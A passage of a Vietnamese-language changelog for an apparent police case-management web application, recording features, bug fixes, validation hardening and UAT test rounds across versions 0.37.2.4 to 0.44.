- **Menu "Nhập ủy thác mới"**: sidebar UTDT nay có 2 mục — Danh sách ủy thác + Nhập ủy thác mới — đồng nhất với pattern Cases / Vụ việc / Đơn thư.
- **Route `/uy-thac-dieu-tra/new` và `/:id/edit`**: lazy-loaded, bọc `Suspense`.

### Fixed
- **`createdBy` select TS compile error**: `fullName` không tồn tại trong Prisma `UserSelect` — đổi thành `firstName` + `lastName`. Sửa cả interface trong list page và display logic (join hai field).
- **Navigation UTDT list**: nút "Nhập ủy thác" và Edit/View trỏ đúng route `/uy-thac-dieu-tra/*` thay vì `/cases/*`.

## [0.44.0.0] - 2026-05-26

**Ủy Thác Điều Tra (UTDT) — module quản lý ủy thác theo Điều 171 BLTTHS 2015**

Hệ thống nay quản lý được cả 3 loại hồ sơ: Vụ án (REGULAR), Vụ việc, Đơn thư — và thêm loại thứ tư: **Ủy Thác Điều Tra**. UTDT tận dụng toàn bộ infrastructure Cases hiện có (extend thành `caseType=UY_THAC_DIEU_TRA`). Không tạo module riêng — tái sử dụng form, service, filter, phân quyền.

### Added
- **Module UTDT**: danh sách 11 cột (Ngày tiếp nhận, Đơn vị giao, Số QĐ, Đối tượng nghi vấn, Tội danh, ĐTV, Thời hạn, Trạng thái phản hồi, Người nhập, Thao tác). Dòng quá hạn highlight đỏ nhạt.
- **4 trạng thái phản hồi** (`trangThaiPhanHoi`): `Đã phản hồi` (xanh) / `Không thực hiện được` (cam) / `Quá hạn` (đỏ) / `Chưa phản hồi` (xám). Tính từ `ketQuaUyThac`, `ngayTraKetQua`, `lyDoKhongThucHienDuoc`, `thoiHanUyThac`.
- **Form UTDT** (Tab 1, 3 section): Thông tin Ủy Thác (Điều 171 BLTTHS) / Thông tin Nguồn Đơn (TT 28/2020) / Kết quả Ủy Thác.
- **In Mẫu 59 + Mẫu 60** (TT 119/2021/TT-BCA): component `@media print` — phân công Phó Thủ trưởng và Điều tra viên thụ lý ủy thác.
- **Enum mới**: `CaseType` (REGULAR | UY_THAC_DIEU_TRA), `LoaiUyThac` (3 giá trị), `CaseProvenance.UY_THAC_DIEU_TRA`.
- **9 cột mới trên bảng `cases`**: `caseType`, `donViGiao`, `soQuyetDinhUyThac`, `ngayTiepNhan`, `thoiHanUyThac`, `loaiUyThac`, `ketQuaUyThac`, `ngayTraKetQua`, `loaiThongTin` + 3 index.
- **Feature flag `uy-thac-dieu-tra`**: tự insert trong migration SQL (`ON CONFLICT DO NOTHING`).
- **12 TDD tests**: tạo UTDT, filter list, 4-state `computeTrangThaiPhanHoi`, 4-state `buildTrangThaiFilter` (DB WHERE), tìm kiếm metadata.

### Changed
- **KPI-3 + KPI-4**: thêm `caseType=REGULAR` vào baseWhere — UTDT không tính vào tỷ lệ khám phá án (80% / 95% chỉ tiêu).
- **Dashboard stats + badge counts**: 6 câu query Case đều thêm `caseType=REGULAR` — UTDT không lẫn vào tổng số liệu trang chủ.
- **Calendar events**: query deadline của Case giới hạn `caseType=REGULAR` — UTDT dùng `thoiHanUyThac` thay deadline.
- **`trangThaiPhanHoi` filter**: dùng `@IsIn()` (không phải `@IsString()`) + `buildTrangThaiFilter()` có `default: return {}` — tránh Prisma P2009 khi nhận giá trị không hợp lệ.
- **`/cases` mặc định**: trả về `caseType=REGULAR`; UTDT list ở route riêng (`/uy-thac-dieu-tra`).

## [0.43.0.0] - 2026-05-26

**Sửa deadlock xóa vòng — Vụ án ↔ Vụ việc có thể xóa độc lập (v0.43)**

Khi Case (Vụ án) tạo Incident (Vụ việc) qua Branch-3, cả hai đều bị chặn xóa: Case guards trên `linkedIncidents.length`, Incident guards trên `linkedCaseId`. Deadlock 100% ở app logic (soft delete không trigger DB cascade).

### Fixed
- **Backend — xóa Case**: bỏ guard `linkedIncidents` khỏi blocker; thay bằng atomic SetNull trong `$transaction` — `Incident.linkedCaseId → null` trước khi soft delete Case. Bỏ TOCTOU re-check cho linkedIncidents trong transaction.
- **Backend — xóa Incident**: bỏ guard `linkedCaseId` khỏi blocker; `$transaction` clear `Case.linkedIncidentId → null` + soft delete Incident (đồng thời clear `Incident.linkedCaseId` trên tombstone để sạch dữ liệu). P2025 concurrent-delete handler.
- **Backend — preflight Incident**: thêm `GET /incidents/:id/delete-preflight` trả về `canDelete`, `willUnlink.case`, `blockers`.
- **Backend — preflight Case**: `willUnlink.incidents` thay `linkedIncidents` trong blockers; document filter dùng `{deletedAt:null}` match với delete().
- **Frontend — CaseListPage**: panel cảnh báo cam khi xóa Case có linked Incidents; `canSubmit` block khi preflight đang load.
- **Frontend — IncidentListPage**: gọi `/incidents/:id/delete-preflight` khi mở modal xóa; hiển thị Case liên kết sẽ bị gỡ; block submit khi preflightLoading.

### Added
- `GET /incidents/:id/delete-preflight` — preflight check mới cho Incident delete flow.

### Changed
- `delete-case-preflight.response.ts`: `willUnlink.incidents[]` thay `blockers.linkedIncidents`.
- Document numbers DTO: thêm `MinLessThanMax` validator, `@MaxLength(200)` trên SegmentDto, `@IsDefined` trên counterConfig.

## [0.42.1.0] - 2026-05-25

**Sửa giờ hiển thị — Luôn hiển thị giờ Việt Nam (UTC+7) trên toàn hệ thống**

Timestamps trong Nhật ký nghiệp vụ và toàn bộ hệ thống hiển thị sai giờ vì `toLocaleString("vi-VN")` không có `timeZone` option — phụ thuộc vào timezone OS của trình duyệt. Máy cài UTC lệch 7 tiếng.

### Fixed
- **Toàn hệ thống (45 file frontend)**: thay thế tất cả `toLocaleString`/`toLocaleDateString`/`toLocaleTimeString` bằng utility functions với `timeZone: 'Asia/Ho_Chi_Minh'` tường minh.
- `frontend/src/lib/dates.ts`: thêm 3 export mới `formatVNDate()`, `formatVNDateTime()`, `formatVNTime()` — luôn hiển thị đúng UTC+7 bất kể timezone OS của người dùng.
- `today()` và `toDateInput()`: dùng `en-CA` locale (→ YYYY-MM-DD) với timezone VN để tránh drift qua midnight.
- `ActivityLogPage`: đếm "hôm nay" dùng `toDateInput(log.timestamp) === today()` — so sánh đúng ngày VN, không còn drift 7 tiếng ở ranh giới UTC midnight.
- Xóa 12 local `formatDate()`/`formatDateTime()` helper functions trong các component — tập trung về `dates.ts`.

### Tests
- 733 frontend tests green (thêm test coverage cho `formatVNDate`, `formatVNDateTime`, `formatVNTime`, `today`, `toDateInput` với UTC anchor timestamps)

## [0.42.0.0] - 2026-05-25

**Document Number Engine — Cấu hình mã số chứng từ qua Admin UI**

### Added
- **Document Number Engine**: cấu hình mã số chứng từ cho 5 loại (Vụ việc, Đơn thư, Hồ sơ, Đề xuất, Ủy thác) qua trang Admin với SELECT FOR UPDATE row-level locking.
- Template Engine: prefix tùy chỉnh, năm, số thứ tự (N chữ số, reset hàng năm), preview live.
- Admin UI: danh sách templates + tạo/sửa modal, hiển thị ví dụ mã số.
- `caseCode` hiển thị trong danh sách vụ án.
- Hành trình hồ sơ: inject synthetic CREATED event cho case cũ không có audit log.
- Teams: fix dropdown bị clip bởi `overflow-hidden`, tăng z-index lên z-50.

## [0.41.1.0] - 2026-05-24

**Thêm thành viên Tổ/Nhóm — multi-select + bug fixes**

### Added
- Trang Quản lý Tổ/Nhóm: thêm nhiều thành viên cùng lúc bằng multi-select — chọn từng user vào queue (hiển thị dạng chip), xác nhận một lần với nút "Thêm N thành viên". User đã chọn hoặc đã thuộc tổ bị tự động loại khỏi kết quả tìm kiếm.

### Fixed
- Auto-incident: `autoIncidentName` lấy đúng tên vụ án từ incident vừa tạo thay vì fallback về `dto.name`.
- Login test: thêm retry logic 5 giây sau khi bị rate-limit, không còn fail do timing.

## [0.41.0.0] - 2026-05-24

**Hành Trình Hồ Sơ — Trang độc lập + Journey endpoints cho Đơn thư & Vụ án**

Cán bộ có thể tra cứu hành trình của bất kỳ hồ sơ nào (Vụ việc / Vụ án / Đơn thư) từ một trang độc lập `/ho-so-journey` — không cần mở từng vụ việc cụ thể. Panel trái: tree navigator với search debounced + 3 nhóm collapsible. Panel phải: timeline đầy đủ của entity được chọn. URL shareable (`?type=CASE&id=...`). Backend bổ sung 2 endpoint mới `GET /petitions/:id/journey` và `GET /incidents/:id/journey` với true server-side pagination và DataScope enforcement.

### Added
- `GET /petitions/:id/journey` — petition-specific timeline (AuditLog-only, true DB-level `count()+skip/take`)
- `GET /incidents/:id/journey` — incident-specific timeline (IncidentStatusHistory + AuditLog, merged)
- `/ho-so-journey` standalone page với split-panel layout (320px navigator + flex timeline)
- `JourneyNavigator` component: search debounced 300ms, 3 collapsible groups, "Tải thêm" button
- `useJourneySearch` hook: AbortController cancel in-flight requests on keystroke
- `usePetitionJourney` + `useIncidentJourney` hooks
- URL state: `?type=CASE&id=...` cho shareable deep links
- Feature module `journey` auto-registered trong sidebar

### Fixed
- `buildActorName` null-safety: `filter(Boolean)` thay vì template literal trực tiếp — ngăn chuỗi `"null"` xuất hiện trong actor name
- Xóa `AUDIT_LOG_FETCH_LIMIT=500` cap trong case/incident journey — không còn cắt ngầm sau 500 events

### Tests
- 12 TCs mới: TC-PJ01–PJ06 (petition journey), TC-IJ01–IJ06 (incident journey)
- 1644 backend + 677 frontend tests green

## [0.40.0.0] - 2026-05-24

**Auto-tạo Đăng ký Vụ việc khi lưu Khởi tố Vụ án (Branch 3)**

Điều tra viên tạo hồ sơ Khởi tố Vụ án và nhập thông tin Tab Vụ việc — hệ thống tự động tạo bản ghi Incident tương ứng trong module Quản lý Vụ việc mà không cần nhập lại thủ công. Áp dụng khi `caseProvenance` ∈ {CQĐT phát hiện trực tiếp, Tiếp nhận chuyển giao, Đối tượng tự thú, Đề nghị VKS, Nguồn pháp lý khác} và ít nhất 1 trong `{ngàyXảyRa, loạiVụViệc, mô tả, địa điểm}` có giá trị.

### Added
- **[cases] Auto-create Incident khi lưu Case Branch-3** — `cases.service.ts`: Branch-3 giờ chạy trong `$transaction` atomic. Nếu `shouldAutoCreateIncident()` trả về true, tạo Incident với code `VV-YYYY-NNNNN` rồi link 1 chiều qua `Incident.linkedCaseId`. Không set `Case.linkedIncidentId` (vi phạm CHECK constraint `case_provenance_fk_consistency`).
- **[cases] `autoLinkedIncident` trong GET `/cases/:id`** — `getById` trả về `{ id, code, name }` của Incident được auto-tạo (reverse lookup qua `Incident.linkedCaseId`) với DataScope enforcement.
- **[cases] `autoLinkedIncident` trong POST `/cases` response** — Create response trả về ngay `autoLinkedIncident: { id, code, name }` sau khi tạo.
- **[incidents] Extract `generateIncidentCode()` ra shared util** — `incident-code.util.ts`: `generateIncidentCode(tx)` nhận `PrismaClient | Prisma.TransactionClient` để dùng cả ngoài và trong `$transaction`. `IncidentsService` import từ util thay vì private method.
- **[cases/frontend] `autoLinkedIncidentId` field** — `types.ts` + `mergeCaseApiToFormData.ts` + `tabs.tsx`: form state lưu ID Incident auto-tạo. Tab Vụ việc hiển thị `LinkedIncidentCard` read-only cho cả FROM_INCIDENT lẫn Branch-3 auto-linked.
- **[frontend] `canUnlink` prop trên `LinkedIncidentCard`** — Branch-3 auto-linked incidents không có nút "Đổi liên kết" (unlink là no-op, không có endpoint PATCH). FROM_INCIDENT vẫn cho phép unlink.

### Tests
- `backend/src/common/utils/incident-factory.util.spec.ts` — 22 unit tests cho `shouldAutoCreateIncident` + `buildIncidentFromCase` (bao gồm invalid date guard)
- `frontend/src/pages/cases/CaseFormPage/__tests__/tabs-incident.test.tsx` — 5 tests kiểm tra routing FROM_INCIDENT vs Branch-3 auto-linked trong `TabIncident`

## [0.39.0.0] - 2026-05-24

**CaseFormPage — Fix Data-Loss Tab 2-9 + Xóa Tab 9 Fake Save**

78 trường form từ Tab 2-9 (Vụ việc, Vụ án, TĐC, Thống kê) bị bỏ qua hoàn toàn khi người dùng nhấn "Lưu hồ sơ" — dữ liệu nhập vào silently dropped. Cùng lúc, nút "Lưu thống kê" ở Tab 9 thực ra là fake (setTimeout 800ms + alert, không gọi API nào), khiến người dùng tưởng dữ liệu đã được lưu nhưng thực ra mất hoàn toàn.

### Fixed
- **[cases] Tab 2-9 data-loss — 78 fields không được serialized vào API payload** — [buildCreateCasePayload.ts](frontend/src/pages/cases/CaseFormPage/buildCreateCasePayload.ts): Thêm tất cả trường Tab 2 (9 fields vụ việc: `incidentCode`, `incidentDate`, `incidentTime`, `incidentLocation`, `incidentDescription`, `incidentType`, `incidentLevel`, `incidentCause`, `incidentMethod`), Tab 3 (10 fields vụ án: `criminalCode`, `criminalDate`, `criminalLocation`, `criminalSecondaryType`, `accusation`, `prosecutionOffice`, `courtName`, `courtHearingDate`, `verdict`, `sentence`), Tab 5 (6 fields TĐC vụ việc: `tdcIncidentCode`, `tdcSource`, `tdcReceiveDate`, `tdcContent`, `tdcResult`, `tdcTransferDate`), Tab 6 (4 fields TĐC vụ án: `tdcCaseCode`, `tdcCaseType`, `tdcProcessingResult`, `tdcClosedDate`), Tab 9 (48 trường `stat_*` thống kê) vào `metadata` JSON. Không cần backend migration — `CreateCaseDto.metadata: Record<string, unknown>` đã nhận any JSON.
- **[cases] Tab 2-9 không được restore khi mở Edit** — [mergeCaseApiToFormData.ts](frontend/src/pages/cases/CaseFormPage/mergeCaseApiToFormData.ts): Thêm restore mapping `meta.field ?? prev.field` cho cùng 78 fields. `stat_damageAmount` dùng `String()` cast để handle backend trả về number.
- **[cases] Tab 9 fake save button** — [tabs.tsx](frontend/src/pages/cases/CaseFormPage/tabs.tsx): Xóa `handleSave` (setTimeout 800ms + alert "Đã lưu", không gọi API), thay bằng hint text "Dữ liệu thống kê được lưu cùng khi bấm 'Lưu hồ sơ' bên trên."

### Changed
- **[cases/tabs.tsx] Dead code cleanup** — Xóa `validate()` function, `validationErrors`/`setValidationErrors` useState, `StatFieldError` component, tất cả usages (12 điểm). Code trở nên unreachable sau khi xóa `handleSave`.

### Added
- **[test] Tab 2-9 data-loss regression tests** — [buildCreateCasePayload.test.ts](frontend/src/pages/cases/CaseFormPage/__tests__/buildCreateCasePayload.test.ts): 7 tests mới kiểm tra từng tab group + `stat_damageAmount` raw-string asymmetry.
- **[test] mergeCaseApiToFormData test suite** — [mergeCaseApiToFormData.test.ts](frontend/src/pages/cases/CaseFormPage/__tests__/mergeCaseApiToFormData.test.ts): File test mới (8 tests) kiểm tra restore logic cho Tab 2/3/5/6/9 + fallback to prev + number→string coerce.

## [0.38.0.0] - 2026-05-24

**UX Refactor — Mask Format Input Số (Currency / Phone / Integer)**

22 trường nhập số trải rộng qua Cases, Incidents, Petitions được nâng cấp thành mask-format-as-you-type. Số tiền hiển thị với dấu phân cách hàng nghìn (`1.000.000.000 ₫`), số điện thoại tự format `0901 234 567`, field số đếm chặn ký tự không hợp lệ tại input level. TDD full: 41 test mới (unit + integration), 630/630 tests green.

### Added
- **[frontend] CurrencyInput component** — [frontend/src/components/inputs/CurrencyInput.tsx](frontend/src/components/inputs/CurrencyInput.tsx). `NumericFormat` với `thousandSeparator="."`, `decimalSeparator=","`, `suffix=" ₫"`, `decimalScale=0`, `allowNegative=false`. Gọi `onValueChange(v.value)` với raw string không có separator — parse tại boundary submit.
- **[frontend] PhoneInput component** — [frontend/src/components/inputs/PhoneInput.tsx](frontend/src/components/inputs/PhoneInput.tsx). `PatternFormat` với `format="#### ### ###"` (không phải NumericFormat — NumericFormat strip leading 0, phá format số VN `0901234567`). Tự động gọi `hydrateLegacyPhone` để normalize data cũ `+84 xxx xxx xxx` → `0xxxxxxxxx`.
- **[frontend] IntegerInput component** — [frontend/src/components/inputs/IntegerInput.tsx](frontend/src/components/inputs/IntegerInput.tsx). `NumericFormat` với `decimalScale=0`, `allowNegative=false`, prop `min`/`max` optional. Dùng cho 15 trường `stat_*` frontend-only (không POST lên BE).
- **[frontend] Form wrappers** — `FormCurrency`, `FormPhone`, `FormInteger` trong [frontend/src/components/form/](frontend/src/components/form/) — label + icon + error wrapper thống nhất với `FormInput` pattern.
- **[frontend] Display components** — `CurrencyDisplay` + `PhoneDisplay` trong [frontend/src/components/displays/](frontend/src/components/displays/) — read-only display với em-dash fallback khi `null`/`undefined`.
- **[frontend] formatters.ts utilities** — [frontend/src/shared/utils/formatters.ts](frontend/src/shared/utils/formatters.ts): `formatVND`, `parseVND`, `formatPhone`, `parsePhone`, `hydrateLegacyPhone`. 18 unit tests cover tất cả edge cases.
- **[e2e] input-mask Playwright spec** — [tests/e2e/input-mask.e2e.spec.ts](tests/e2e/input-mask.e2e.spec.ts): 3 scenarios (@input-mask) kiểm tra currency format khi type, phone preserve leading 0, submit boundary gửi number không phải string.

### Fixed
- **[cases] damageAmount gửi BE là number không phải string** — [buildCreateCasePayload.ts:95](frontend/src/pages/cases/CaseFormPage/buildCreateCasePayload.ts#L95): `parseVND(formData.damageAmount) ?? undefined` đảm bảo `metadata.damageAmount` là `number` (hoặc `undefined` nếu rỗng). Trước đây gửi string `"1000000"` — backend lưu metadata JSON blob nên accept, nhưng sẽ break nếu có type check sau.
- **[cases] reporterPhone + subject.phone gửi BE đã strip space** — `parsePhone(formData.reporterPhone)` và `parsePhone(s.phone)` trong buildCreateCasePayload đảm bảo DB nhận `"0901234567"` không phải `"0901 234 567"`.
- **[cases] mergeCaseApiToFormData convert damageAmount số → string** — [mergeCaseApiToFormData.ts:68](frontend/src/pages/cases/CaseFormPage/mergeCaseApiToFormData.ts#L68): BE trả về `meta.damageAmount` có thể là number, convert `String(meta.damageAmount)` cho form state. Form state luôn là string (AD-1).
- **[petitions] senderPhone regex đơn giản hoá** — Regex `/^[0-9\s+()-]{10,15}$/` cũ cho phép nhiều format không nhất quán. Thay bằng `/^0\d{9}$/` — PhoneInput handle blocking tại input level.

### Changed
- **[cases/tabs.tsx] 17 input fields → mask components** — damageAmount → `FormCurrency`, reporterPhone → `FormPhone`, stat_damageAmount/stat_recoveredAmount → `CurrencyInput`, 11 trường stat_count → `IntegerInput`. [frontend/src/pages/cases/CaseFormPage/tabs.tsx](frontend/src/pages/cases/CaseFormPage/tabs.tsx).
- **[cases/modals.tsx] Subject phone + Evidence quantity** — Subject `phone` → `FormPhone`, Evidence `quantity` → `FormInteger`. [frontend/src/pages/cases/CaseFormPage/modals.tsx](frontend/src/pages/cases/CaseFormPage/modals.tsx).
- **[incidents] sdtNguoiToGiac → PhoneInput** — [IncidentFormPage.tsx](frontend/src/pages/incidents/IncidentFormPage.tsx): số ĐT người tố giác dùng `PhoneInput` với `PatternFormat`.
- **[petitions] senderPhone → PhoneInput** — [PetitionFormPage.tsx](frontend/src/pages/petitions/PetitionFormPage.tsx): thay `<input>` + regex validation bằng `PhoneInput` component.

## [0.37.3.0] - 2026-05-23

**UAT Round 1 fix** — fix 4 backend bug từ UAT comprehensive v2 (781 TC chạy thực trên prod 171.244.40.245, 263 PASS / 518 FAIL / 0 SKIP). 92% failures là test infrastructure (rate limit + placeholder ID). 4 backend bugs real được verify qua 3 Explore agents + plan-eng-review.

### Added
- **[backend] PrismaExceptionFilter centralized** — [backend/src/common/filters/prisma-exception.filter.ts](backend/src/common/filters/prisma-exception.filter.ts). `@Catch(Prisma.PrismaClientKnownRequestError)` map mọi Prisma error sang HTTP status có ý nghĩa: P2003 (FK violation) → 400 INVALID_REFERENCE, P2002 (unique) → 409 DUPLICATE_VALUE, P2025 (record not found) → 404 RECORD_NOT_FOUND. Register TRƯỚC GlobalExceptionFilter trong [main.ts](backend/src/main.ts) để NestJS resolve specific filter trước catch-all. Trước đây Prisma errors leak 500 INTERNAL_ERROR khắp 30+ services.

### Fixed
- **[cases] TC-142 P0 — `DeleteCaseDto.reason` thiếu `@IsNotEmpty()`** — Cho phép payload null/whitespace slip qua DTO validation. Thêm `@Transform(trim)` + `@IsNotEmpty({message:'Lý do xóa bắt buộc'})` vào [delete-case.dto.ts](backend/src/cases/dto/delete-case.dto.ts). Cùng pattern fix cho [restore-case.dto.ts](backend/src/cases/dto/restore-case.dto.ts) (lý do khôi phục).
- **[proposals] TC-582 P0 — `CreateProposalDto.proposalNumber` thiếu `@IsNotEmpty()`** — Cho phép tạo Proposal với mã rỗng `''`. Thêm Transform trim + IsNotEmpty vào [create-proposal.dto.ts](backend/src/proposals/dto/create-proposal.dto.ts).
- **[conclusions] TC-484/485/507 P0 — `conclusions.service.create()` + `update()` không catch P2003 → 500** — Khi `caseId` không tồn tại, Prisma throw P2003 bubble lên 500 INTERNAL_ERROR. Centralized PrismaExceptionFilter (mới) catch P2003 → 400 BadRequest với message tiếng Việt. Service code không cần edit.
- **[proposals] TC-622 P0 — `proposals.service.create()` không validate `relatedCaseId` exists** — Cùng pattern P2003 bug. Centralized filter handle, không cần edit service.

### Test coverage
- 4 unit test file mới: `delete-case.dto.spec.ts` (7 tests), `restore-case.dto.spec.ts` (5), `create-proposal.dto.spec.ts` (4), `prisma-exception.filter.spec.ts` (5).
- Backend full suite: 1556/1556 PASS, 0 regression.
- TypeScript `tsc --noEmit`: 0 errors.

### UAT artifact
- [docs/uat/uat_quan_ly_vu_viec.xlsx](docs/uat/uat_quan_ly_vu_viec.xlsx) — mở rộng từ 69 TC (v1) → 781 TC (v2) đạt formula MAX(100, dynamic) cho module Cases ~1700 LOC + sub-resources. 518 bug records auto-tạo trong Bug Tracker sheet. Sau Round 1 expect 10 TC chuyển Pass.
- [docs/uat/uat_quan_ly_vu_viec.md](docs/uat/uat_quan_ly_vu_viec.md) — companion 1.1 MB với Fix Context + Bug YAML template cho Claude Code đọc.
- [tests/uat-auto/](tests/uat-auto/) — 113 Playwright spec files, 781 tests API-level execution trên prod. Run: `UAT_PROD=1 npx playwright test tests/uat-auto/`.

### Plan + Review
- Plan: [~/.claude/plans/quiet-wiggling-cake.md](~/.claude/plans/quiet-wiggling-cake.md).
- /plan-eng-review chốt D1: Centralized filter thay vì per-service try-catch (DRY, NestJS best practice).

### Out of scope (Round 2)
- Audit sweep ~6 DTO khác có cùng gap @IsNotEmpty thiếu (CreateLawyerDto, CreateSubjectDto, etc.).
- Test infrastructure fix: login JWT cache (diệt 435 fail rate limit), seed fixtures (1 Case/Petition/Incident valid + crimeId), role mapping wardOfficer/dispatcher chính xác, file upload multipart cho 13 Document tests.
- Cleanup local P2025 try-catch ở cases.service.ts:387-392 (deprecated bởi centralized filter).

## [0.37.2.7] - 2026-05-23

**UAT hotfix** — 6 bug phát hiện trong UAT comprehensive Quản lý vụ việc 2026-05-23 (69 TC chạy trên prod, 51 PASS / 6 FAIL / 12 SKIP). Fix nhóm validation backend + A11Y/refactor frontend + sửa UAT spec.

### Fixed
- **[cases] BUG-001 P0 — `POST /cases` chấp nhận `name=""` (trả 201)** — DTO `name` thiếu `@IsNotEmpty()`. Thêm `@Transform(({value}) => value.trim())` + `@IsNotEmpty({message:'Tên vụ án bắt buộc'})` vào [create-case.dto.ts](backend/src/cases/dto/create-case.dto.ts). Reject empty + whitespace-only + auto-trim leading/trailing space.
- **[cases] BUG-002 P1 — `name="      "` (whitespace-only) trả 201** — Cùng fix Transform+IsNotEmpty ở trên (Transform chạy trước validator).
- **[cases] BUG-004 P2 — `name="   X   "` lưu nguyên whitespace** — Auto-trim trong Transform decorator.
- **[cases][a11y] BUG-005 P2 — Tab keyboard không landing trên element focusable trên `/cases/new`** — Thêm `autoFocus` cho FormSelect "Nguồn vụ án" (field đầu tiên). [tabs.tsx:127](frontend/src/pages/cases/CaseFormPage/tabs.tsx#L127). Cải thiện UX cho user khi bắt đầu tạo vụ án mới.
- **[cases][a11y] BUG-006 P2 — Status badge thiếu `data-testid` + class không match selector pattern** — Refactor inline `<span>` ở [CaseListPage.tsx:704](frontend/src/pages/cases/CaseListPage.tsx#L704) dùng `<StatusBadge>` component đã có sẵn. Thêm `data-testid={\`status-badge-${id}\`}` để test E2E reliable.
- **[tests/uat] BUG-003 P1 — TC-039 đọc field `createdAt` không tồn tại** — Schema `CaseStatusHistory` chỉ có `changedAt`. Sửa UAT spec dùng đúng field + đảo order check sang asc (service `orderBy: { changedAt: 'asc' }`).

### Added
- **[tests/uat] `tests/uat/quan-ly-vu-viec.spec.ts`** — 69 TC chuẩn enterprise theo bộ [uat_quan_ly_vu_viec.xlsx](docs/uat/uat_quan_ly_vu_viec.xlsx) (12 loại: GREEN/RED/BOUNDARY/EP/STATE/DECISION/SECURITY/DATA/PERFORMANCE/A11Y/COMPAT/AUDIT). Mix API direct + UI E2E. Chạy trên prod qua `UAT_PROD=1 npx playwright test`.
- **[tests] POM + helpers** — `tests/pages/LoginPage.ts`, `tests/pages/CasesPage.ts`, `tests/helpers/api-client.ts`.
- **[backend] `create-case.dto.spec.ts`** — 3 unit test mới: empty name reject, whitespace-only reject, trim leading/trailing.
- **[component] FormSelect** — prop `autoFocus?: boolean` forward xuống `<select>` native.
- **[component] StatusBadge** — prop `data-testid?: string` forward xuống `<span>`.
- **[config] `playwright.config.ts`** — env var `UAT_PROD=1` switch sang prod (skip webServer, load `tests/.env.test`, json reporter).

### Test coverage
- Backend Cases: 87 tests pass (4 file: create-case.dto.spec.ts +3, cases.service.spec.ts, cases.controller.spec.ts, update-case.dto.spec.ts).
- Frontend typecheck: PASS.
- UAT prod: 51/69 PASS lần 1; sau fix mong đợi ≥57/69.

## [0.37.2.6] - 2026-05-23

**P1 hotfix** — TAM_DINH_CHI / PHUC_HOI vụ án workflow broken trên prod. Phát hiện trong UAT comprehensive Case management 2026-05-23.

### Fixed
- **[cases] PUT `/cases/:id` với `status=TAM_DINH_CHI` reject 400 "Validation failed"** — `cases.service.update()` casts dto to `Record<string,unknown>` để access 8 trường BLTTHS Điều 229 (`lyDoTamDinhChiVuAn`, `lyDoTamDinhChiText`, `soQuyetDinhTamDinhChi`, `ngayTamDinhChi`) và Phục hồi (`daRaSoat`, `ngayRaSoat`, `soQuyetDinhPhucHoi`, `ketQuaPhucHoiVuAn`). Không trường nào declared trong UpdateCaseDto. ValidationPipe `forbidNonWhitelisted: true` strips/rejects → toàn bộ TAM_DINH_CHI + Phục hồi flow broken kể từ khi feature ship. Fix: declare 8 fields trong [UpdateCaseDto](backend/src/cases/dto/update-case.dto.ts) với proper class-validator decorators (`@IsEnum(LyDoTamDinhChiVuAn)`, `@IsEnum(KetQuaPhucHoiVuAn)`, `@IsString @MaxLength`, `@IsDateString`, `@IsBoolean`).

### Added
- **[tests] `update-case.dto.spec.ts`** — 8 vitest cases regression cover: lyDoTamDinhChiVuAn valid/invalid enum, lyDoTamDinhChiText/soQuyetDinhTamDinhChi/ngayTamDinhChi string+date validation, daRaSoat/ngayRaSoat/soQuyetDinhPhucHoi PHUC_HOI fields, ketQuaPhucHoiVuAn enum valid/invalid, daRaSoat non-boolean rejected.

### Test coverage
- Backend cases module: 84 tests pass (was 76, +8 new).
- TypeScript: clean.

### Discovered
UAT comprehensive Case management 2026-05-23 (Phase B / B6). Em apply `uat-test-writer` Iron rule #5: P1 bug → stop UAT current phase + TDD red-green + ship separate PR. Resume UAT post-deploy.

### Followups (deferred)
- Other status flows có thể có DTO mismatch tương tự (chưa scan). Defer to follow-up audit.

## [0.37.2.5] - 2026-05-23

Cleanup loạt followups sau UAT 2026-05-23 — P1 EditMode load + P1 phantom Petition guard + P2 Cases form Decision 7A.

### Fixed
- **[cases] EditMode KHÔNG load `caseProvenance` + linked FK + sourceDocumentNote** — `CaseFormPage` useEffect đọc case data từ API nhưng quên 4 cột provenance → khi anh edit existing case, `formData.caseProvenance=""` → PUT payload sent empty enum → BE @IsEnum reject (silent 400 hoặc nuke provenance). Fix: extract pure helper `mergeCaseApiToFormData` ([frontend/src/pages/cases/CaseFormPage/mergeCaseApiToFormData.ts](frontend/src/pages/cases/CaseFormPage/mergeCaseApiToFormData.ts)) bao gồm tất cả 4 field provenance từ API response. 5 regression tests cover edge cases.
- **[cases.service.update] Phantom Petition auto-create REMOVED** — service line 666-695 trước đây auto-create row Petition giả khi PUT /cases có `metadata.petitionType` nhưng không có linked Petition. Đây là attack surface vi phạm BLTTHS Đ.143 (provenance model — Petition phải có người gửi thật, không tạo side-effect từ Case mutation). FE đã không gửi field này từ v0.37.1, nhưng BE attack surface còn mở. Fix: silently ignore `metadata.petitionType` khi không có linked Petition (vẫn sync khi có).
- **[cases] Form thiếu top-summary validation alert** (Decision 7A spec từ v0.37.1 plan) — chỉ inline errors, không có aria-assertive summary ở top như Petitions + Incidents form. Fix: add `role="alert" aria-live="assertive"` summary banner liệt kê tất cả errors, scroll to top khi submit fail. Browser `alert()` popup removed.

### Added
- **[tests] `editModeProvenanceLoad.test.tsx`** — 5 vitest cases cover mergeCaseApiToFormData edge cases (FROM_PETITION/FROM_INCIDENT/DIRECT_DISCOVERY load, null fallback, preserve metadata).
- **[tests] `cases.service.spec.ts` regression test inverted** — "should NOT create phantom petition when petitionType added and no linked petition exists" replaces previous test that asserted auto-create behavior.

### Audit
- **Directory↔Enum mismatch scan** across all forms (Cases, Incidents, Petitions, Subjects, Lawyers) — 0 additional P0 bugs phát hiện. Pattern v0.37.2.4 unique (Petitions petitionType). Incidents enum fields dùng hardcoded options từ `status-labels.ts` — safe. Petition priority + Case stat_ fields dùng @IsString hoặc metadata-only — safe.

### Test coverage
- Frontend: 577 tests pass (was 572, +5 new).
- Backend cases module: 76 tests pass.
- TypeScript: clean (FE + BE).

### Followups (đã đóng từ v0.37.1 audit + Round 1-3 UAT)
- ✅ CaseFormPage EditMode missing caseProvenance load (P1)
- ✅ convertToCase phantom Petition (P1)
- ✅ Cases form Decision 7A top summary (P2)
- Directory↔Enum scan: 0 additional bugs

### Followups remaining (deferred)
- STT auto-generation cho Petitions (currently manual user input)
- Strengthen feature-registry.spec test để cross-check FE manifests có BE entry
- Auto-trigger `npm run db:seed:features` trong deploy.sh

## [0.37.2.4] - 2026-05-23

**P0 hotfix** — Đăng ký Đơn thư không submit được, BE reject Vietnamese name. Anh test thật + phát hiện sau khi em mark UAT "PASS-WITH-NOTES" sai (đã skip happy-path).

### Fixed
